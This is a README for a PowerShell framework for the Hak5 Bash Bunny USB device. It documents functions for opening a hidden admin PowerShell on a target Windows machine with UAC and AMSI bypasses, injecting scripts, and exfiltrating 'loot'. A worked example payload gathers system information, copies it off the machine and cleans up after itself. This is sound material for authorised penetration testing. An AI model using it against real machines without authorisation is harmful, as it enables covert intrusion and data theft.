# Bashbunny-Powershell-Framework
Powershell Framework for the Hak5 Bashbunny
===========================================

* Author: p3rki3
* Extension
* Version: 0.92     December 2020
* Firmware support: 1.6
* Target version: Windows 10

## Description
The Bashbunny Powershell Framework is an extension for the Hak5 Bashbunny that radically simplies the interaction between the Bashbunny and a victim windows machine.  The Framework provides a simple set of functions to load an admin powershell (complete with AMSI bypass), load modules into that powershell from the Bashbunny, run scripts from the Bashbunny and exfiltrate loot back to the bunny.  
Modules, scripts and loot can be exchanged between the Bashbunny and target computer using the Bashbunny's ability to simulate either a network device or a mass storage device as well as a keyboard.
The Bashbunny Powershell Framework uses a powershell module and a python script in addition to the bash extension file.  The Framework will create these files in the switch folder on payload execution (they are archived as heredocs in the extension itself) as needed.
So, as long as the bash bunny powershell framework extension is loaded into the extensions folder on the bashbunny, and is marked as executable, then you are good to go - no need to copy other framework files around

## Configuration
1. Copy bbpsfw.sh to the bashbunny extensions folder and ensure it has executable permissions (otherwise nothing will happen!).
2. Create/copy your payload.txt file, and any supporting powershell modules and powershell script files to a switch folder
2. Plug your Bashbunny into the target machine with the appropriate payload switch setting, and wait for the green light
3. Enjoy your loot, if any, in the designated loot folder

## Using the Framework
The framework exists to simplify your payload.txt file for powershell attacks.  Instead of 'QUACK'ing long arcane strings on the windows run line or powershell commands (and worrying whether you have escaped the right things for bash), you use simple functions, like ...

    INVOKE_POWERSHELL "NET" "QUIET" 
    INJECT_PSSCRIPT "stage1.ps1" "PassHashes.txt"

The Framework takes care of loading an admin powershell on the target machine, completing the UAC bypass, an AMSI bypass, running your scripts, importing your modules and exfiltrating loot.

The full Framework consists of the following bash functions

    INVOKE_POWERSHELL <"NET" or "STORAGE" or "BOTH"> <"QUIET", "VISIBLE" or "NOISY"> < "ON" or "OFF">   
    INJECT_PSMODULE <Powershell Module FileName>
    INJECT_PSSCRIPT <Powershell Script FileName> <Optional: Bashbunny loot FileName>
    INJECT_PSCOMMAND <"Powershell command line">
    INJECT_PSFILE <File to inject> <Optional: "RUN" or "NOEXEC" (default) or blank>
    REMOVE_PSTEMPFILE <List of temp files to remove from powershell environment>
    CLOSE_POWERSHELL
    STASH_LOOT <Loot Directory Name>

There is a helper function loaded into Powershell that assists with exfiltrating loot

    Invoke-BBExfil <Windows filename to exfiltrate>

If you omit any mandatory Framework function parameters, then the Framework will save an error message in the switch folder in a 
file called "fail.dbg", and you will get a red 'FAIL' LED on the bashbunny.

The Framework also has debug capabilities which can be turned on using a third parameter to the INVOKE_POWERSHELL function

    INVOKE_POWERSHELL "NET" "QUIET" "ON"

## Framework Functions - Bashbunny
The INVOKE_POWERSHELL function takes three optional parameters; the first ("NET" or "STORAGE") determines whether files will be shared using a simulated ethernet device or a simulated mass storage device.  The default is "NET".
The second parameter determines how 'noisy' the attack will be, ranging from "QUIET" (Hidden Powershell window, Windows run line cleared) through to "NOISY" (Visible powershell and windows run line left).  The default is "QUIET".  
The final parameter will determine if the debug trace file is created ("ON") or not ("OFF").  The default is "OFF"

If you omit the parameters, then INVOKE_POWERSHELL will default to INVOKE_POWERSHELL "NET" "QUIET" "OFF"

INVOKE_POWERSHELL will set up the correct ATTACKMODE for the Bashbunny, and a webserver if required; it will load an admin Powershell on the target windows machine, and perform a UAC bypass.  Finally, it will load a framework module into Powershell with some helper functions for the Bashbunny Powershell Framework (creating the module on the fly, if necessary, from a heredoc stored in the extension itself).

In your payload.txt file, you can also set a variable to control how much time the payload gives windows and powershell time to 'catch up'. Default is 1, but can be overridden by setting the variable SLEEPTIME to any other value prior to INVOKE_POWERSHELL.  For example,

    SLEEPTIME="5"  # For a very slow windows machine
    INVOKE_POWERSHELL etc., etc.

The INJECT_PSMODULE function simply injects a module file from the same directory as the payload.txt file into the powershell on the target computer.  The module will be automatically imported into the powershell environment using powershell's Import-Module command.

The INJECT_PSSCRIPT function injects a script file into the powershell on the target computer.  In addition to the script filename, you can also pass the name of a loot file.  Note that to exfiltrate your loot to this file, you must call 

    Invoke-BBExfil <Windows filename to exfiltrate>

in your powershell script.  The example scripts show how to capture the output of commands into temporary files in Windows and then exfiltrate to the Bashbunny as loot.

The INJECT_PSFILE function injects a file from the Bashbunny payload switch folder into powershell temporary environment.  Optionally, you can also run the file if it is executable.  The first parameter is the name of the file to inject; if the second paramter is "RUN", then it will be executed in powershell. 

REMOVE_PSTEMPFILE will remove any file from the Powershell temporary directory that is listed as an argument to the function - typically you would call this just before CLOSE_POWERSHELL with a list of any modules, scripts or other files you have injected into Powershell.  The framework will take care of removing any temporary files it has created itself when CLOSE_POWERSHELL is called.

CLOSE_POWERSHELL does cleanup and exits powershell (unless you have set "NOISY" in the INVOKE_POWERSHELL parameters)

STASH_LOOT will move your exfiltrated loot files from a loot sub-folder of the switch folder (where they are stored while the payload is running) into /loot/<Directory>n where Directory is the parameter passed to the function, and n is a number which increments from zero.  This allows you to run the payload multiple times without having to clear down loot folders, or get your loot overwritten.

## Framework Functions - Powershell
Most of the framework functions are internal to the framework to support the loading of modules and scripts. There is one function that you will need to use in your powershell scripts to exfiltrate any loot back to the bashbunny

    Invoke-BBExfil <Windows filename to exfiltrate>

The other functions in the framework are designed as helper functions to be called from bash by the framework.  They are however aliased and available in powershell should you find a use for them in your powershell scripts!

## Worked Example

As a worked example, suppose that we want to write a powershell script to run the powershell command   Get-ComputerInfo, capture the output to a file and save it to the bashbunny as loot.  We want this payload to be as invisible as possible, without using the bashbunny's mass storage attackmode.  How would we use the framework to do that?

First off, let's create the powershell script that we will run.  It will contain the command Get-ComputerInfo, pipe the output to a temporary file (we will use a temporary file in the powershell temp directory), and then exfiltrate this file to the bashbunny using the framework.  Lastly, it cleans up the temporary file after we have exfiltrated it.

    Get-ComputerInfo > $env:TEMP\tempfile.txt
    Invoke-BBExfil $env:TEMP\tempfile.txt
    echo "" > $env:TEMP\tempfile.txt
    del $env:TEMP\tempfile.txt

And that is it on the powershell side - save this as getinfo.ps1 in the payload switch directory of your choice.

Now for the bashbunny payload.  Again, the bashbunny powershell framework makes this very straightforward:

    LED SETUP
    INVOKE_POWERSHELL                                 # Start up powershell - the framework will default to NET QUIET OFF 
    LED ATTACK
    INJECT_PSSCRIPT getinfo.ps1 CompInfo.txt          # Run the script getinfo.ps1 and capture the loot to CompInfo.txt
    LED CLEANUP
    REMOVE_PSTEMPFILE getinfo.ps1                     # Note you do NOT need to invoke this function for any loot files
    CLOSE_POWERSHELL                                  # CLose down powershell and tidy up the windows run line
    STASH_LOOT CompInfo                               # Save the loot properly on the bashbunny
    LED FINISH
    
And again, it is that simple, particularly if you use the NET mode!!  No QUACKing of complicated run lines; no need to execute a UAC or AMSI bypass, both of which are done by the framework as a matter of course.  No need to clean the windows run line when you finish, or eject the bashbunny.  Save this file as payload.txt in the same switch folder as getinfo.ps1.  Safely eject your bashbunny and select the correct payload switch.  Plug it into your target windows machine, wait for the light to go maroon, yellow, cyan, white then green and enjoy your loot.

## Example Payloads

A number of examples are provided in this repo to help with using the framework:

  a prank payload - locknpwn - which waits 5 minutes, locks the workstation and speaks a 'You've been pwned' message periodically
  
  a couple of recon/exfil payloads which show how to inject a module, run scripts and exfiltrate loot. One of these is based on the community payload InfoGrabber to show how to convert an existing payload to use the framework.
  
  an exploitation payload which loads Nishang powerpreter into powershell for further recon/exfiltration, etc.

## But what if my payload fails?

We all write payloads that don't work first time (or second, third for that matter).  The framework provides some tools and options to help you work out where your payload is failing during development and testing.

If the framework hits a fatal error, the bashbunny LED will flash red, and an error message will be written to a file named  fail.dbg   in the payload switch directory on the bashbunny.  Typically this will be missing files or required parameters.
If the payload runs but does not do what you expected, then there are two main things you can do:
  a) You can get the framework to run with powershell visible rather than hidden - to do this, use VISIBLE as the second parameter to INVOKE_POWERSHELL
  b) You can also get the framework to save a debug file that will list out the entry and exit to framework functions - use ON as the third parameter to INVOKE_POWERSHELL

So, for example, during development you might want to start the framework with

    INVOKE_POWERSHELL   NET NOISY ON

and then when fully developed and tested, simply revert back to... 

    INVOKE_POWERSHELL   NET QUIET OFF

The effect of using VISIBLE ON as the last two parameters of INVOKE_POWERSHELL is to make the powershell window visible while the payload runs and prevent it being closed when the payload finishes.  A debug trace will be written into the payload switch directory on the bashbunny (file bbps.dbg) which should help tell you where the script failed (and possibly why).

You can add your own debug trace messages in your payload.txt file by using the framework command...

    bbps_debug "Add your own debug trace message here"

## Limitations
When being used, the Framework needs to control ATTACKMODE on the Bashbunny; it also needs to control the current directory on the  Bashbunny.  As a result, you must NOT use any ATTACKMODE or cd/pushd/popd commands until after you have finished using the Framework.

All parameters to Framework functions are mandatory except where noted above - the Framework will fail if they are omitted, writing out a failure message to fail.dbg in the switch folder.  The LED will show red for a fatal error.

## Recommendations
The NET method is to be preferred, not simply because it is less 'noisy' (no windows explorer popups as the drive is mapped), but also because it is possible to keep the payload.txt and powershell scripts in sync more easily.   The exfiltration of loot using the NET method uses a python script on the Bashbunny side which will not return until the loot exfiltration is finished. This prevents the payload.txt file moving on to its next step until your powershell script has finished.  If you use the STORAGE 
method, then you must supply sufficient 'sleep' time in payload.txt to ensure that the bashbunny does not run ahead of the target machine.

## Disclaimer
This Bashbunny Powershell Framework is provided 'as-is' and I do not guarantee it is of any use to anybody for any purpose whatsoever.  Keep your use of the Framework legal and ethical.  I am not responsible for anything you decide to do with the Framework.
TL;DR (UK Version) - Don't be a dick like Dom

## Led status as set by the Framework

| LED                                           | Status        |
|-----------------------------------------------|---------------|
| Magenta slow blink                            | NET Setup     |
| Magenta fast blink                            | STORAGE Setup |
| Magenta solid                                 | Starting up   |
| Red solid                                     | FAIL          |
| Cyan slow blink                               | Exfiltration  |
| Cycling through colours, then White fast blink| Cleanup & exit|
